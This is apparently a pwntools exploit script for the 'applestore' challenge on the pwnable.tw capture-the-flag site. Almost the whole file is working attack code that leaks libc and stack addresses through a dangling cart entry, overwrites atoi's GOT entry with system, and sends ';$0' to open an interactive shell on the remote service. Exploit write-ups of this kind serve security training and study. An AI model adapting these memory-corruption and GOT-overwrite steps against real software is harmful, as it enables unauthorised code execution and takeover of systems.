#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import os
import sys

elfPath = "./applestore"
libcPath = "./libc_32.so.6"
remoteAddr = "chall.pwnable.tw"
remotePort = 10104

context.binary = elfPath
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = context.binary
if sys.argv[1] == "l":
    context.log_level = "debug"
    io = process(elfPath)
    libc = elf.libc

else:
    context.log_level = "info"
    if sys.argv[1] == "d":
        io = remote("localhost", 9999)
    else:
        io = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath)

success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(pidof(io)[0])).readlines()[1], 16)
        cmd = ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd = ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c\nhandle SIGALRM nostop"

    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

def add(idx):
    io.sendlineafter("> ", "2")
    io.sendlineafter("> ", str(idx))

def delete(payload):
    io.sendlineafter("> ", "3")
    io.sendlineafter("> ", payload)

def cart(payload):
    io.sendlineafter("> ", "4")
    io.sendlineafter("> ", "y\n" + payload)

def checkout():
    io.sendlineafter("> ", "5")
    io.sendlineafter("> ", "y")

if __name__ == "__main__":
    for i in xrange(20):
        add(2)
    for i in xrange(6):
        add(1)

    #  DEBUG([0x8048B98])
    checkout()
    #  DEBUG([0x8048B03])
    cart(p32(elf.got['read']) + p32(0) * 2)
    io.recvuntil("27: ")
    libc.address = u32(io.recvn(4)) - libc.sym['read']
    success("libc.address", libc.address)

    #  DEBUG([0x8048B03])
    cart(p32(libc.sym[u'environ']) + p32(0) * 2)
    io.recvuntil("27: ")
    environ = u32(io.recvn(4))
    success("environ", environ)

    #  DEBUG([0x80489FD])
    delete('27' + p32(0x08049002) + p32(0) + p32(elf.got['atoi'] + 0x22) + p32(environ - 0x104 - 0x8))
    
    io.sendlineafter("> ", p32(libc.sym['system']) + ";$0\0")

    io.interactive()
    io.close()


